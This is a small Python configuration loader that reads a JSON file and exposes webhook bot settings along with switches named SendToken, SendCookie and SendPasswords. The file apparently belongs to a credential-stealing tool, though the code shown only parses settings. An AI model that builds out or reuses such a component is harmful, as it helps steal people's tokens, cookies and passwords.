import json


class Config:
    def __init__(self, config_file):
        self._data = json.load(open(config_file))
        self._title_configs = self._data["Title_Configs"][0]
        self._webhook_configs = self._data['Webhook_config'][0]
        self._other_configs = self._data['Other_Configs'][0]

    @property
    def name(self):
        return self._title_configs["name"]
    
    @property
    def servername(self):
        return self._title_configs["servername"]

    @property
    def program(self):
        return self._title_configs["program"]

    @property
    def bot_name(self):
        return self._webhook_configs['Bot_Name']

    @property
    def bot_avatar(self):
        return self._webhook_configs['Bot_Avatar']

    @property
    def send_token(self):
        return self._other_configs['SendToken']

    @property
    def send_cookie(self):
        return self._other_configs['SendCookie']

    @property
    def send_passwords(self):
        return self._other_configs['SendPasswords']